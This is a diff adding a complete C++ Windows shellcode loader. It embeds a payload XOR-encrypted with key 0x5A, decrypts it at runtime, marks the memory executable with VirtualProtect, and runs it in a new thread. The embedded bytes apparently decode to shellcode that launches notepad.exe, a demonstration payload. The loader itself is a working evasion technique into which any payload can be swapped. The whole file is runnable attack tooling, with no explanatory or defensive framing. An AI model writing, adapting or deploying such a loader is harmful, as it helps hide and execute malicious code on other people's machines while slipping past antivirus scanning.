@@ -1,0 +1,79 @@
+#include <windows.h>
+#include <iostream>
+#include <cstring>
+#include <cstddef>
+
+int main()
+{
+    unsigned char encryptedPayload[] = {
+"\xA6\x12\xD9\xBE\xAA\xB2\x9A\x5A\x5A\x5A\x1B"
+"\x0B\x1B\x0A\x08\x0B\x0C\x12\x6B\x88\x3F\x12"
+"\xD1\x08\x3A\x12\xD1\x08\x42\x12\xD1\x08\x7A"
+"\x12\xD1\x28\x0A\x12\x55\xED\x10\x10\x17\x6B"
+"\x93\x12\x6B\x9A\xF6\x66\x3B\x26\x58\x76\x7A"
+"\x1B\x9B\x93\x57\x1B\x5B\x9B\xB8\xB7\x08\x1B"
+"\x0B\x12\xD1\x08\x7A\xD1\x18\x66\x12\x5B\x8A"
+"\xD1\xDA\xD2\x5A\x5A\x5A\x12\xDF\x9A\x2E\x3D"
+"\x12\x5B\x8A\x0A\xD1\x12\x42\x1E\xD1\x1A\x7A"
+"\x13\x5B\x8A\xB9\x0C\x12\xA5\x93\x1B\xD1\x6E"
+"\xD2\x12\x5B\x8C\x17\x6B\x93\x12\x6B\x9A\xF6"
+"\x1B\x9B\x93\x57\x1B\x5B\x9B\x62\xBA\x2F\xAB"
+"\x16\x59\x16\x7E\x52\x1F\x63\x8B\x2F\x82\x02"
+"\x1E\xD1\x1A\x7E\x13\x5B\x8A\x3C\x1B\xD1\x56"
+"\x12\x1E\xD1\x1A\x46\x13\x5B\x8A\x1B\xD1\x5E"
+"\xD2\x12\x5B\x8A\x1B\x02\x1B\x02\x04\x03\x00"
+"\x1B\x02\x1B\x03\x1B\x00\x12\xD9\xB6\x7A\x1B"
+"\x08\xA5\xBA\x02\x1B\x03\x00\x12\xD1\x48\xB3"
+"\x0D\xA5\xA5\xA5\x07\x12\xE0\x5B\x5A\x5A\x5A"
+"\x5A\x5A\x5A\x5A\x12\xD7\xD7\x5B\x5B\x5A\x5A"
+"\x1B\xE0\x6B\xD1\x35\xDD\xA5\x8F\xE1\xAA\xEF"
+"\xF8\x0C\x1B\xE0\xFC\xCF\xE7\xC7\xA5\x8F\x12"
+"\xD9\x9E\x72\x66\x5C\x26\x50\xDA\xA1\xBA\x2F"
+"\x5F\xE1\x1D\x49\x28\x35\x30\x5A\x03\x1B\xD3"
+"\x80\xA5\x8F\x34\x35\x2E\x3F\x2A\x3B\x3E\x74"
+"\x3F\x22\x3F\x5A" // Encrypted payload with XOR key <0x5A> from encryptor.cpp
+    };
+
+    constexpr std::size_t payloadSize = 276;
+    constexpr unsigned char key = 0x5A;
+
+    void *mem;
+    mem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (mem == NULL)
+    {
+        std::cout << "[-] Error during allocating mem " << GetLastError() << std::endl;
+        return 1;
+    }
+    std::cout << "[+] Memory allocated at " << mem << std::endl;
+    
+    for(std::size_t i=0; i<payloadSize; i++)
+    {
+        encryptedPayload[i] = encryptedPayload[i] ^ key;
+    } // Decrypt payload
+
+    std::memcpy(mem, encryptedPayload, payloadSize);
+
+    DWORD oldProtect;
+    if(!VirtualProtect(mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect))
+    {
+        std::cout << "[-] Error during changing the protects " << GetLastError() << std::endl;
+        return 1;
+    }
+    std::cout << "[+] Protects were changed from RW to RX (0x" << std::hex << oldProtect << ")" << std::endl;
+    
+
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    if (hThread == NULL)
+    {
+        std::cout << "[-] CreateThread failed: " << GetLastError() << std::endl;
+        return 1;
+    }
+    std::cout << "[+] Shellcode thread started" << std::endl;
+    
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+
+    VirtualFree(mem, 0, MEM_RELEASE);
+
+    return 0;
+}
